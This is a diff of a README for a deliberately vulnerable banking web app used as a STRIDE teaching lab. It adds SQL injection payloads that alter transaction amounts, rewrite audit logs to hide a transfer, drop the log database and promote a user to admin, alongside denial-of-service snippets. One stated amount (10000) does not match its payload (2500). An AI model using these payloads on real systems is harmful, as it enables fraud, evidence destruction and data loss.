@@ -1,27 +1,33 @@
+<!-- omit from toc -->
 # Banking Web App
 
 This web application is intentionally vulnerable to many attacks, a few of those are SQLi, DoS, Identity Spoofing, and more...
 
 The banking application conforms to the STRIDE Threat Modelling Methodology.
 
-Table of Contents
-- [Banking Web App](#banking-web-app)
-    - [Spoofing](#spoofing)
-      - [Brute Force](#brute-force)
-      - [SQLi Attack](#sqli-attack)
-      - [Predictable Session Token](#predictable-session-token)
-    - [Tampering](#tampering)
-    - [Repudiation](#repudiation)
-    - [Information Disclosure](#information-disclosure)
-      - [Unprotected API Endpoints](#unprotected-api-endpoints)
-      - [Error Message Leaks](#error-message-leaks)
-      - [Database Dump](#database-dump)
-      - [Attack Simulation script using Python](#attack-simulation-script-using-python)
-    - [Denial of Service](#denial-of-service)
-      - [SQL Payload for DoS:](#sql-payload-for-dos)
-      - [API Endpoint Exploitation (assuming the database has numerous transactions)](#api-endpoint-exploitation-assuming-the-database-has-numerous-transactions)
-      - [Session Storage Bomb](#session-storage-bomb)
-    - [Elevation of Privilege](#elevation-of-privilege)
+<!-- omit from toc -->
+## What does this README.md contain???
+- [Spoofing](#spoofing)
+  - [Brute Force](#brute-force)
+  - [SQLi Attack](#sqli-attack)
+  - [Predictable Session Token](#predictable-session-token)
+- [Tampering](#tampering)
+  - [Payload for Tampering](#payload-for-tampering)
+- [Repudiation](#repudiation)
+  - [SQL Payload in modifying logs](#sql-payload-in-modifying-logs)
+  - [Real-life Example of Repudiation](#real-life-example-of-repudiation)
+  - [SQL Payload to drop database](#sql-payload-to-drop-database)
+- [Information Disclosure](#information-disclosure)
+  - [Unprotected API Endpoints](#unprotected-api-endpoints)
+  - [Error Message Leaks](#error-message-leaks)
+  - [Database Dump](#database-dump)
+  - [Attack Simulation script using Python](#attack-simulation-script-using-python)
+- [Denial of Service](#denial-of-service)
+  - [SQL Payload for DoS:](#sql-payload-for-dos)
+  - [API Endpoint Exploitation (assuming the database has numerous transactions)](#api-endpoint-exploitation-assuming-the-database-has-numerous-transactions)
+  - [Session Storage Bomb](#session-storage-bomb)
+- [Elevation of Privilege](#elevation-of-privilege)
+  - [SQL Payload for Privilege Escalation](#sql-payload-for-privilege-escalation)
 
 
 ### Spoofing
@@ -57,8 +63,54 @@ token = hashlib.md5("admin" + str(int(time.time()))).hexdigest()
 ---------------------------
 ### Tampering
 
+**Tampering** in STRIDE refers to the act of **unauthorized modification of data**. This allows the attacker to edit, or delete files or data. In this system, since the web app is vulnerable to SQLi, the attacker can send a payload in the `Search Transaction` part of the `All Transactions` Page.
+
+#### Payload for Tampering
+This payload **modifies** the **amount of the transaction** with the ID of **number 3** from **whatever the initial value** is, to **10000**.
+
+```sql
+'; UPDATE transactions SET amount=2500 WHERE id = 3; --
+```
+
 ---------------------------
+
 ### Repudiation
+
+**Repudiation** refers to situations where users can **deny performing certain actions** because of the **lack of** the **system's evidence** to **prove otherwise**.
+
+In this web app, the system `has vulnerabilities` to its way of `storing logs`. Logs are stored in the same database with no backups done. This `no backing up` of the `logs` `allow attackers` to `manipulate it` to `wipe out their actions` and to refute the claim that they done something to the system because there are no logs to prove it.
+
+#### SQL Payload in modifying logs
+
+```sql
+'; UPDATE audit_logs SET user_id = 2 WHERE user_id = 1; --
+```
+
+#### Real-life Example of Repudiation
+
+```html
+<!-- Illegal Money Transfer -->
+POST /transfer.php?amount=1000&recipient=attacker
+
+<!-- Modification of Logs -->
+ GET /search.php?query=';UPDATE+audit_logs+SET+user_id=3+WHERE+action='MONEY_TRANSFER';--
+```
+
+Since there is no logging done when the log itself are altered (i.e. secondary audit trail or syslog), the attacker can: 
+
+1. Disable logging through some attack
+2. Perform Malicious Actions
+3. Re-enable logging
+
+
+Or entierly drop the database of the logs.
+
+#### SQL Payload to drop database
+
+```sql
+'; DROP DATABASE audit_logs;
+```
+
 
 ---------------------------
 ### Information Disclosure
@@ -147,7 +199,7 @@ GET /api/transactions.php?limit=1000000
 ```
 
 #### Session Storage Bomb
-- The attacker canb flood the server with fake sessions
+- The attacker can flood the server with fake sessions
 ```python
 import requests
 
@@ -160,3 +212,13 @@ for i in range(10000):
 ---------------------------
 ### Elevation of Privilege
 
+**Elevation of Privilege** is seen in this web app by the **ability of a normal user** to **execute sql commands** to **elevate their access to admin**.
+
+This payload exploits the vulnerability of the system towards SQLi by modifying the role of user1 to become `admin` instead of `user`
+
+#### SQL Payload for Privilege Escalation
+```sql
+'; UPDATE users SET role='admin' WHERE username='user1' -- 
+```
+
+Elevation of Privilege in this system is limited since there is no access to a separate server. But if you would opt to run this on a different machine, you can do some shenanigans and run scripts via XAMPP that would allow you to modify the machine itself rather than just modifying the database contents.
